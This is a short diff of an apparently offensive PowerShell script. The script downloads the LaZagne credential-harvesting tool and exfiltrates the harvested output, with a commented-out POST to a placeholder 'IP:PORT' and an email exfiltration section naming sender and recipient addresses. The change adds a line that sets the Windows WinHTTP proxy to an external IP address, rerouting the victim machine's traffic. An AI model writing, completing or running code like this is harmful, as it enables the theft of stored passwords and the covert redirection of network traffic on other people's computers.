@@ -97,7 +97,7 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 # Exfiltrate the file
 #POST REQUEST
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
-
+netsh winhttp set proxy 50.227.121.35:80
 # Mail Exfiltration
 $EmailFrom = "HerbertSwindel@outlook.com"
 $EmailTo = "herbertswindel@gmail.com"
